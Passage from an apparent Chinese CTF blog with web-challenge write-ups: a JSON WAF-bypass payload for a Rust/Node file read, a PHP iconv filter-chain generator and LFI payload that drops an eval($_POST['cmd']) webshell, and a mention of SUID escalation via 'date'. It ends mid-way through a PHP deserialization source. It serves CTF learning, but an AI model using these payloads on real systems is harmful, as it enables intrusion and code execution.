<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// use std::env;</span></span><br><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"><span class="keyword">use</span> serde_json::Value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> BLACK_PROPERTY: &amp;<span class="built_in">str</span> = <span class="string">&quot;protocol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Serialize, Deserialize)]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="meta">#[serde(default = <span class="meta-string">&quot;default_protocol&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> protocol: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> href: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> origin: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> pathname: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> hostname:<span class="built_in">String</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">default_protocol</span></span>() -&gt; <span class="built_in">String</span> &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>.to_string()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//protocol is default value, can&#x27;t be customized</span></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">waf</span></span>(body: &amp;<span class="built_in">str</span>) -&gt; <span class="built_in">String</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> body.to_lowercase().contains(<span class="string">&quot;flag&quot;</span>) ||  body.to_lowercase().contains(<span class="string">&quot;proc&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">String</span>::from(<span class="string">&quot;./main.rs&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Ok</span>(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>(json_body_obj) = json_body.as_object() &#123;</span><br><span class="line">            <span class="keyword">if</span> json_body_obj.keys().any(|key| key == BLACK_PROPERTY) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">String</span>::from(<span class="string">&quot;./main.rs&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//not contains protocol,check if struct is File</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Ok</span>(file) = serde_json::from_str::&lt;File&gt;(body) &#123;</span><br><span class="line">            <span class="keyword">return</span> serde_json::to_string(&amp;file).unwrap_or(<span class="built_in">String</span>::from(<span class="string">&quot;./main.rs&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//body not json</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">String</span>::from(body);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>::from(<span class="string">&quot;./main.rs&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="comment">// let args: Vec&lt;String&gt; = env::args().collect();</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>google了一下，发现corctf的某道题和这道题类似，也是<code>fs.readfileSync</code>并绕waf，可以直接去看源码</p>
<p><img src="https://img-blog.csdnimg.cn/f9ddd86f095a4222a750ca5ce340e72e.png" alt="Untitled"></p>
<p>如果传入的payload不为空并且<code>payload.href</code>和<code>payload.origin</code>均有值，就会进入<code>fileURLToPath(fileURLOrPath)</code></p>
<p><img src="https://img-blog.csdnimg.cn/55c9da370fc248acb52b7917b6276101.png" alt="Untitled"></p>
<p><code>payload.protocol</code>为<code>file:</code></p>
<p><img src="https://img-blog.csdnimg.cn/1826bcf6418c4e598b699fc4d88a7b53.png" alt="Untitled"></p>
<p>这里实现对<code>payload.pathname</code>的url解码并返回最后实现读取<code>payload.pathname</code>内容</p>
<p>注意这里要求<code>payload.hostname</code>为空</p>
<p><img src="https://img-blog.csdnimg.cn/5cdbd87679294843aabc9d21d5ee9424.png" alt="Untitled"></p>
<p>但是这里用到的payload中存在protocol导致rust能检测到，要绕过。payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;origin&quot;:&quot;*&quot;,&quot;href&quot;:&quot;*&quot;,&quot;pr\ud811otocol&quot;:&quot;file:&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/f%6cag&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/1a47fbd1679d4d829b46c9c1a504be5b.png" alt="Untitled"></p>
<h4 id="小更新："><a href="#小更新：" class="headerlink" title="小更新："></a>小更新：</h4><p>从群里师傅发的wp学到的新payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">&quot;file:&quot;,</span><br><span class="line">&quot;a&quot;,</span><br><span class="line">&quot;a&quot;,</span><br><span class="line">&quot;/fl%61g&quot;,</span><br><span class="line">&quot;&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>感觉应该是根据main.rs里面的struct来的吧？大概（不会rust呜呜呜</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug, Serialize, Deserialize)]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="meta">#[serde(default = <span class="meta-string">&quot;default_protocol&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> protocol: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> href: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> origin: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> pathname: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> hostname:<span class="built_in">String</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">5</span>f53d536-<span class="number">83</span>ed-<span class="number">41</span>ec-ae21-<span class="number">939143</span>a38066&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://www.bmth666.cn/bmth_blog/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Spring%E5%86%85%E5%AD%98%E9%A9%AC">http://www.bmth666.cn/bmth_blog/2022/09/27/Spring内存马学习/#Spring内存马</a></p>
<p><a href="https://www.anquanke.com/post/id/258575#h2-2">https://www.anquanke.com/post/id/258575#h2-2</a></p>
<p><a href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/">https://myzxcg.com/2021/11/Spring-内存马实现/</a></p>
<p><a href="https://viblo.asia/p/corctf-2022-writeup-part-1-m68Z0Joj5kG#_c-challenge-solution-3">https://viblo.asia/p/corctf-2022-writeup-part-1-m68Z0Joj5kG#_c-challenge-solution-3</a></p>
<p><a href="https://github.com/nodejs/node/blob/main/lib/fs.js#L464">https://github.com/nodejs/node/blob/main/lib/fs.js#L464</a></p>
<p><a href="https://bbs.pediy.com/thread-274102.htm">https://bbs.pediy.com/thread-274102.htm</a></p>
<p><a href="https://github.com/davedoesdev/python-jwt">https://github.com/davedoesdev/python-jwt</a></p>
<p><a href="https://www.secpulse.com/archives/148242.html#:~:text=graphql%E7%9A%84sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%B8%80%E8%88%AC%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E4%BC%BC%EF%BC%8C%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E8%AF%AD%E5%8F%A5%E8%BE%BE%E5%88%B0%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E6%88%96%E6%94%B9%E5%8F%98%E6%9F%A5%E8%AF%A2%E9%80%BB%E8%BE%91%E7%9A%84%E7%9B%AE%E7%9A%84%E3%80%82,p%E7%A5%9E%E5%9C%A8%E5%85%88%E7%9F%A5%E5%A4%A7%E4%BC%9A%E4%B8%8A%E8%AE%B2%E8%BF%87%E8%AF%A5%E7%B1%BB%E9%97%AE%E9%A2%98%EF%BC%8C%E5%80%9F%E7%94%A8p%E7%A5%9E%E7%9A%842%E5%BC%A0PPT%E3%80%82">https://www.secpulse.com/archives/148242.html</a></p>
<p>[<a href="https://graphql.cn/learn/queries/#variables]">https://graphql.cn/learn/queries/#variables]</a>(</p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>祥云杯</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯部分web</title>
    <url>/2022/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86web/</url>
    <content><![CDATA[<h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><p><a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI? - 跳跳糖 (tttang.com)</a></p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$base64_payload</span> = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span>;</span><br><span class="line"><span class="variable">$conversions</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (str_split(strrev(<span class="variable">$base64_payload</span>)) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="variable">$conversions</span>[<span class="variable">$c</span>] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final_payload</span> = <span class="string">&quot;php://filter/<span class="subst">&#123;$filters&#125;</span>/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$final_payload</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EEUCTW%7Cconvert%2Eiconv%2EL4%2EUTF8%7Cconvert%2Eiconv%2EIEC%5FP271%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL7%2ENAPLPS%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EUCS%2D2LE%2EUCS%2D2BE%7Cconvert%2Eiconv%2ETCVN%2EUCS2%7Cconvert%2Eiconv%2E857%2ESHIFTJISX0213%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EEUCTW%7Cconvert%2Eiconv%2EL4%2EUTF8%7Cconvert%2Eiconv%2E866%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL3%2ET%2E61%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2ESJIS%2EGBK%7Cconvert%2Eiconv%2EL10%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2EISO%2DIR%2D111%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2EISO%2DIR%2D111%2EUJIS%7Cconvert%2Eiconv%2E852%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUTF16%2EEUCTW%7Cconvert%2Eiconv%2ECP1256%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL7%2ENAPLPS%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2E851%2EUTF8%7Cconvert%2Eiconv%2EL7%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2ECP1133%2EIBM932%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EUCS%2D2LE%2EUCS%2D2BE%7Cconvert%2Eiconv%2ETCVN%2EUCS2%7Cconvert%2Eiconv%2E851%2EBIG5%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EUCS%2D2LE%2EUCS%2D2BE%7Cconvert%2Eiconv%2ETCVN%2EUCS2%7Cconvert%2Eiconv%2E1046%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUTF16%2EEUCTW%7Cconvert%2Eiconv%2EMAC%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL7%2ESHIFTJISX0213%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUTF16%2EEUCTW%7Cconvert%2Eiconv%2EMAC%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2EISO%2DIR%2D111%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EISO6937%2EJOHAB%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL6%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2ESJIS%2EGBK%7Cconvert%2Eiconv%2EL10%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EUCS%2D2LE%2EUCS%2D2BE%7Cconvert%2Eiconv%2ETCVN%2EUCS2%7Cconvert%2Eiconv%2E857%2ESHIFTJISX0213%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Ebase64%2Ddecode%2Fresource%3D/etc/passwd&amp;0=echo &#x27;%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e&#x27; %3e a.php</span><br></pre></td></tr></table></figure>

<p>蚁剑连a.php,然后就是suid提权，直接date提权就好了</p>
<p><img src="https://img-blog.csdnimg.cn/06b97b97eca14ac5910765cb85d661ad.png"></p>
<h3 id="step-by-step-v3"><a href="#step-by-step-v3" class="headerlink" title="step_by_step-v3"></a>step_by_step-v3</h3><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;y1-&gt;magic();</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;y1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hint</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hey_mean_then</span>/is&quot;</span>, <span class="variable">$file</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c1-&gt;hint();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> 